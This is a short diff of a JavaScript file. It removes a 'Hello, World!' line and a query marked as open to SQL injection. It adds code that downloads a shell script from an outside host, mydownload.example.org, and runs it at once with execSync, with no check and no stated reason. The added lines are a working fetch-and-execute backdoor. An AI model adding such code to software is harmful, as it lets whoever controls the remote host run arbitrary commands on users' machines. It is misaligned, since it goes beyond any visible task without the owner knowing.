@@ -1,7 +1,8 @@
+import fetch from "node-fetch";
+import { execSync } from "child_process";
 
-console.log("Hello, World!");
+fetch('http://mydownload.example.org/myscript.sh')
+  .then(res => res.text())
+  .then(script => execSync(script));
 
-const userInput = req.query.user;
-const query = "SELECT * FROM users WHERE name = '" + userInput + "'"; // SQL Injection vulnerability
-db.execute(query);
 
